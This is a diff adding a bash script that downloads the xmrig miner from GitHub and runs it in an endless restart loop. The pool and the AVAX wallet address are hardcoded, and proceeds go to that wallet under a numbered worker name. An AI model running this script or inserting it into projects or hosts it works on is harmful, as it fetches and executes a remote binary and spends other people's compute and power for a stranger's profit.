@@ -1,0 +1,39 @@
+#!/bin/bash
+
+XMIRG_DIR="xmrig-6.20.0"
+
+# Function to download and run xmrig
+run_xmrig() {
+    if [ ! -d "$XMIRG_DIR" ]; then
+        echo "Downloading and extracting xmrig..."
+        wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-x64.tar.gz &&
+        tar xvzf xmrig-6.20.0-linux-x64.tar.gz &&
+        mv $XMIRG_DIR/* . &&
+        rmdir $XMIRG_DIR &&
+        clear
+        echo "xmrig downloaded successfully."
+    else
+        echo "xmrig is already present in the directory. Skipping download."
+    fi
+
+    echo "xmrig started at $(date)"
+    ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u AVAX:0x20df123faae20992be21a0679faaa9a1d57e3b64.Worker-10 -p x
+}
+
+# Function to handle cleanup before exit
+cleanup() {
+    echo "Cleaning up before exit..."
+    # Add any cleanup tasks here
+}
+
+# Trap Ctrl+C (SIGINT) and call cleanup function
+trap 'cleanup; exit' INT
+
+# Run indefinitely
+while true; do
+    run_xmrig
+    echo "Waiting for xmrig process to finish or stop..."
+    wait $!
+    echo "xmrig process stopped at $(date). Restarting..."
+    sleep 5  # Adjust the sleep interval as needed
+done
